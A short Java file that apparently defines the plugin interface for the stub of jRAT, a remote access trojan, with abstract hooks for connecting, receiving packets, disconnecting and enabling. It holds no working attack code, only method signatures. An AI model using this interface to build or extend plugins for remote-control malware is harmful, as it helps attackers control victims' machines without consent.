package org.jrat.project.api;

import java.io.DataInputStream;
import java.io.DataOutputStream;

public abstract class RATStubPlugin {
	
	public abstract String getName();
	
	public abstract void onDisconnect(Exception ex) throws Exception;
	
	public abstract void onConnect(DataInputStream dis, DataOutputStream dos) throws Exception;
	
	public abstract void onPacket(String header) throws Exception;
	
	public abstract void onEnable() throws Exception;
}